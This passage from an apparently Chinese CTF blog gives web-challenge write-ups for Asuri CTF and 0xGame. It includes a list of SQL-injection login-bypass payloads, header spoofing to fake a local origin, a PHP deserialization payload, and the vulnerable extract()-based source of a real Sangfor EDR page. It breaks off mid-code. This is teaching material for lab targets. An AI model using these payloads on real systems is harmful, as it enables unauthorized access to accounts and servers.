<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//寮曞叆flag鍜宎bc鍙橀噺</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$abc</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>



<p>get直接收个a参数，a=abc就出flag，非常简单</p>
<h3>最终</h3>
payload：./?a=abc

<p>问题解决：Asuri{php_is_amazing}</p>
<hr />
<h2>GET</h2>
<h3>怀疑asuri水题</h3>
题目地址：<a class="url" href="http://106.15.177.94:10019" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10019</a>

<p>打开得源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//flag.php涓�$flag鍙橀噺</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ans'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ans'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'hello_world'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>



<p>不说了</p>
<h3>最终</h3>
payload：./ans=hello_world

<p>问题解决：Asuri{get_is_simple}</p>
<hr />
<h2>管理员</h2>
<h3>sql注入</h3>
题目地址：<a class="url" href="http://106.15.177.94:10012/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10012/</a>

<p>打开提示登录管理员</p>
<p>尝试登录：<code>1' or 1=1 #</code></p>
<p>直接登录成功了…</p>
<p>后来尝试，还有多种payload</p>
<h3>最终</h3>
payload：
<pre><code>' or 0=0 #
' or 1=1 or ''='
x' or 1=1 or 'x'='y
a' or 'a' = 'a
anything' OR 'x'='x
'%20or%20''='
'%20or%20'x'='x
' or 0=0 #
' or 1 --'
' or 1=1 or ''='
hi' or 'a'='a
' or username like '%
' or 1=1 or ''='
' or ''='
x' or 1=1 or 'x'='y
</code></pre>
大同小异，都记录下来，日后学习

<p>问题解决：Asuri{Web_1s_easy}</p>
<hr />
<h2>管理员2</h2>
<h3>同上</h3>
一样，payload登录提示要从本地登录
加个<code>X-Forwarded-For: 127.0.0.1</code>即可

<h3>最终</h3>
问题解决：Asuri{1m_Adm1n}

<hr />
<h2>php序列化</h2>
<h3>序列化</h3>
<h4>告诉我靶场题目有问题???我淦</h4>
题目地址：<del><a class="url" href="http://106.15.177.94:10014" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10014</a></del>
新地址：<a class="url" href="http://desperadoccy.club:39016" target="_blank" rel="noopener noreferrer">http://desperadoccy.club:39016</a>

<p>有时间再写</p>
<h3>最终</h3>
payload：
<code>http://desperadoccy.club:39016/?exp=O:10:%22FileReader%22:4:&#123;s:8:%22Filename%22;S:4:%22\66lag%22;s:5:%22start%22;i:0;s:10:%22max_length%22;i:5;&#125;</code>
&&
<code>http://desperadoccy.club:39016/?exp=O:10:%22FileReader%22:4:&#123;s:8:%22Filename%22;S:4:%22\66lag%22;s:5:%22start%22;i:6;s:10:%22max_length%22;i:13;&#125;</code>

<p>问题解决：Asuri{php_serial1ze}</p>
<hr />

      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/Asuri_ctf-WEB-Write-up/" data-id="cklc0zh1i0009fpovd65iglns" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-0XGame WEB Write-up" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/0XGame-WEB-Write-up/" class="article-date">
  <time datetime="2020-10-10T08:57:25.000Z" itemprop="datePublished">2020-10-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Write-Up/">Write-Up</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/0XGame-WEB-Write-up/">0XGame WEB Write-up</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>by:gyy</p>
<h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><h3 id="考察robots协议"><a href="#考察robots协议" class="headerlink" title="考察robots协议"></a>考察robots协议</h3><h4 id="题目地址：http-web-game-0xctf-com-30051"><a href="#题目地址：http-web-game-0xctf-com-30051" class="headerlink" title="题目地址：http://web.game.0xctf.com:30051/"></a>题目地址：<a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30051/">http://web.game.0xctf.com:30051/</a></h4><p>知识链接：</p>
<p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
<p>直接访问./robots.php</p>
<pre class="language-none"><code class="language-none">User-agent: *
Allow: &#x2F;
User-agent: CTFer
Disallow: &#x2F;flaaaggg.php</code></pre>



<h3 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h3><p>访问/flaaaggg.php即可</p>
<p>问题解决：0xGame{now_you_k0nw_robots_Protocol}</p>
<h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>考察会不会看源码</p>
<h3 id="最终-1"><a href="#最终-1" class="headerlink" title="最终"></a>最终</h3><p>f12看源码就行</p>
<p>问题解决：0xGame{web_sign_in}</p>
<h2 id="get-amp-post"><a href="#get-amp-post" class="headerlink" title="get&amp;post"></a>get&amp;post</h2><h3 id="考察get与post的应用"><a href="#考察get与post的应用" class="headerlink" title="考察get与post的应用"></a>考察get与post的应用</h3><p>打开直接给代码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'acd666tql'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$c</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Do you konw GET &amp; POST ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span></code></pre>



<p>代码审计，get传参，post传参即可</p>
<h3 id="最终-2"><a href="#最终-2" class="headerlink" title="最终"></a>最终</h3><p>payload：<code>./?0xGame=acd666tql</code><br>post:<code>X1cT34m=acd666tql</code></p>
<p>问题解决：0xGame{Get_4nd_P0sT_1s_eA5y}</p>
<h2 id="wh1sper’s-secret-garden"><a href="#wh1sper’s-secret-garden" class="headerlink" title="wh1sper’s_secret_garden"></a>wh1sper’s_secret_garden</h2><h3 id="考察http协议"><a href="#考察http协议" class="headerlink" title="考察http协议"></a>考察http协议</h3><h4 id="题目地址：http-web-game-0xctf-com-30050"><a href="#题目地址：http-web-game-0xctf-com-30050" class="headerlink" title="题目地址：http://web.game.0xctf.com:30050/"></a>题目地址：<a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30050/">http://web.game.0xctf.com:30050/</a></h4><p>打开发现：</p>
<pre class="language-none"><code class="language-none">你需要使用wh1sper浏览器来访问
什么？没有？
没有wh1sper浏览器还想打web？</code></pre>



<p>抓包改包,浏览器改成wh1sper</p>
<pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1
Host: web.game.0xctf.com:30050
Cache-Control: max-age&#x3D;0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9
Connection: close</code></pre>




<p>然后发现</p>
<pre class="language-none"><code class="language-none">你需要来自：https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;</code></pre>



<p>伪造地址三种方式：</p>
<pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Host: 127.0.0.1
Referer: 127.0.0.1</code></pre>



<p>这里<code>Referer: https://ctf.njupt.edu.cn/</code></p>
<p>再发包，发现</p>
<pre><code>你得从本地访问才行哟！
</code></pre>
<p>改包，加上<code>X-Forwarded-For: 127.0.0.1</code></p>
<h3 id="最终-3"><a href="#最终-3" class="headerlink" title="最终"></a>最终</h3><p>发包：</p>
<pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1
Host: web.game.0xctf.com:30050
Cache-Control: max-age&#x3D;0
Upgrade-Insecure-Requests: 1
Referer: https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9
Connection: close</code></pre>


<p>问题解决：0xGame{宁就是接头霸王?}</p>
<h2 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h2><h3 id="考察linux指令"><a href="#考察linux指令" class="headerlink" title="考察linux指令"></a>考察linux指令</h3><h4 id="题目地址：http-web-game-0xctf-com-30054"><a href="#题目地址：http-web-game-0xctf-com-30054" class="headerlink" title="题目地址：http://web.game.0xctf.com:30054/"></a>题目地址：<a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30054/">http://web.game.0xctf.com:30054/</a></h4><p>进去看到<code>请输入linux指令</code></p>
<h3 id="最终-4"><a href="#最终-4" class="headerlink" title="最终"></a>最终</h3><p>直接cat /flag</p>
<p>问题解决：0xGame{fl4g_1s_c0ntent}</p>
<h2 id="edr"><a href="#edr" class="headerlink" title="edr"></a>edr</h2><h3 id="考察edr和搜索引擎"><a href="#考察edr和搜索引擎" class="headerlink" title="考察edr和搜索引擎"></a>考察edr和搜索引擎</h3><h4 id="题目地址：http-web1-game-0xctf-com-40000"><a href="#题目地址：http-web1-game-0xctf-com-40000" class="headerlink" title="题目地址：http://web1.game.0xctf.com:40000/"></a>题目地址：<a target="_blank" rel="noopener" href="http://web1.game.0xctf.com:40000/">http://web1.game.0xctf.com:40000/</a></h4><p>深信服edr的漏洞</p>
<p>这里有一篇介绍：<a class="url" href="https://www.weixiuzhan.cn/news/show-21463.html" target="_blank" rel="noopener noreferrer">https://www.weixiuzhan.cn/news/show-21463.html</a></p>
<p>源码在这</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**

 * c.php
 * 查看ldb的日志
 * 支持正则表达式过滤，可以过滤文件以及每行日志
   */</span>

<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/**

   * 编解码
      @param string $data 编解码数据
        * @return string 返回编解码数据
          /
              $code = function($data) &#123;
          for ($i = 0; $i &lt; strlen($data); ++$i) &#123;
              $data[$i] = $data[$i] ^ 'G';
          &#125;
          return $data;
              &#125;;
/**
 * 加密请求
 * @param string $site  站点
 * @param string $query 请求串
 * @return string 返回请求URL
 */</span>
<span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$site</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$site</span></span>/<span class="token interpolation"><span class="token variable">$path</span></span>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 解密回复
 * @param string $data 回复数据
 * @return array 返回回复数据
 */</span>
<span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$dec</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$dec</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 找到匹配的日志
 * @param string $path 文件路径匹配
 * @param string $item 日志项匹配
 * @param string $topn TOP N 
 * @param string $host 主机
 * @return array 返回匹配结果
 */</span>
<span class="token variable">$collect</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token variable">$topn</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$path</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$item</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http://127.0.0.1:8089"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"op=ll&amp;host=<span class="token interpolation"><span class="token variable">$host</span></span>&amp;path=<span class="token interpolation"><span class="token variable">$path</span></span>&amp;item=<span class="token interpolation"><span class="token variable">$item</span></span>&amp;top=<span class="token interpolation"><span class="token variable">$topn</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 显示某个表单域
 * @param array $info 表单域信息, array("name" => "xx", "value" => "xxx", "note" => "help");
 * @return
 */</span>
<span class="token variable">$show_input</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>&lt;font size=2><span class="token interpolation"><span class="token variable">$title</span></span>: &lt;/font>&lt;input type=\"text\" size=30 id=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" name=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" value=\"<span class="token interpolation"><span class="token variable">$value</span></span>\">&lt;font size=2><span class="token interpolation"><span class="token variable">$note</span></span>&lt;/font>&lt;/p>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 去掉反斜杠
 * @param string $var 值
 * @return string 返回去掉反斜杠的值
 */</span>
<span class="token variable">$strip_slashes</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 显示表单
 * @param array $params 请求参数
 * @return
 */</span>
<span class="token variable">$show_form</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$strip_slashes</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$show_input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span>
    <span class="token variable">$path</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$row</span>   <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 绘制表单</span>
    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;pre>"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;form id="studio" name="studio" method="post" action="">'</span><span class="token punctuation">;</span>
    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Host "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"host"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$host</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - host, e.g. 127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Path "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"path"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$path</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - path regex, e.g. mapreduce"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Row  "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"row"</span><span class="token punctuation">,</span>   <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$row</span><span class="token punctuation">,</span>   <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - row regex, e.g. \s[w|e]\s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Limit"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"limit"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - top n, e.g. 100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;input type="submit" id="button">'</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;/form>'</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/pre>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 入口函数
 * @param array $argv 配置参数
 * @return
 */</span>
<span class="token variable">$main</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span> 
    <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$collect</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$collect</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>
